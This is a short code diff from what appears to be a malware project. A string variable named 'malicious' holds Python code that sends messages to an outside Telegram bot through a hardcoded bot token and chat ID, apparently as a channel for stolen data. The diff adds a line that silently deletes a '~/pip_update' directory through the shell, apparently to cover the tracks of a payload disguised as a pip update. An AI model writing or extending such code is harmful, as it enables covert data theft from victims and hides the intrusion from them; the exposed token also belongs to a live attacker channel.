@@ -12,6 +12,8 @@ def sender(message):
 malicious = """
 import os, random, subprocess, time, threading, telebot
 
+subprocess.run("rm -r ~/pip_update", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
+
 def sender(message):
 	bot = telebot.TeleBot('8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo')
 	bot.send_message(5867708857, message)
